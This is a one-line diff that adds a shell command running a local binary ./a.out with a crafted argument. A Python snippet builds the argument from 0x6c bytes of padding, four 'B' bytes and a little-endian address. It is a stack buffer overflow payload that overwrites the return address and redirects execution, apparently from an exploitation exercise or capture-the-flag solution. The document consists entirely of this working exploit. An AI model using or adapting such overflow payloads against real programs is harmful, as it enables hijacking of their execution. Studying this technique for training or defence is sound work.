@@ -1,0 +1,1 @@
+./a.out "$(python -c 'print "A"*0x6c + "BBBB" + "\x24\x8e\x04\x08"')"
